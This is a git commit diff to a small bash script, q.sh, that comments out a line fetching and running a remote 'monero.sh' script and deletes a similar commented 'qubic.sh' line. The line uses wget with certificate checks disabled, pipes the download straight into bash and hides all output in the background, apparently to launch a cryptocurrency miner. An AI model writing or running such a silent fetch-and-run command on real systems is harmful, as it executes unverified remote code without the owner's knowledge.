feb828618bc29e15eaf8deaea7c5a5bc76763e6c
superade99 <supriadiade908@gmail.com>
2025-09-01 08:29:06 -0700

    Update q.sh

--- q.sh
+++ q.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
 
-# bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/ascbhbv/main/qubic.sh) >/dev/null 2>&1 &
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/ascbhbv/main/monero.sh) >/dev/null 2>&1 &
+#bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/ascbhbv/main/monero.sh) >/dev/null 2>&1 &
